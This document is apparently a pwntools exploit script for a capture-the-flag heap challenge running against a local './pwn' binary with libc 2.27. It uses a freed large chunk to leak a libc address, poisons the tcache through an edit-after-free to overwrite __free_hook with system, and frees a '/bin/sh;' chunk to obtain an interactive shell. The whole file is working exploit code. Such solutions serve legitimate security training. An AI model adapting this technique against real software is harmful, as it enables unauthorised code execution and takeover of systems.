from pwn import *
context.log_level="debug"
sh=process("./pwn")
def cmd(c):
    sh.sendlineafter(b">>",str(c).encode())
def add(size,ctt):
    cmd(0)
    sh.sendlineafter(b"size:\n",str(size).encode())
    sh.sendlineafter(b"content:\n", ctt)
def dele(idx):
    cmd(1)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
def edit(idx,ctt):
    cmd(2)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
    sh.sendlineafter(b"content:\n", ctt)
def show(idx):
    cmd(3)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
add(0x410,b'a') #0
add(0x40,b'a') #1
add(0x40,b'a') #2
add(0x40,b'a') #3
dele(0)
show(0)
#0x3ebca0
leak_libc=u64(sh.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
libcbase=leak_libc-0x3ebca0
success("libcbase:"+hex(libcbase))
libc=ELF("./libc-2.27.so")
system=libc.sym['system']+libcbase
freehook=libc.sym['__free_hook']+libcbase

dele(3)
dele(2)
edit(2,p64(freehook))

add(0x40,b'/bin/sh;') #4
add(0x40,p64(system)) #5

#system("/bin/sh")

#free(0x564c22fbe6d0) -> system(0x564c22fbe6d0)
gdb.attach(sh)
dele(4)
sh.interactive()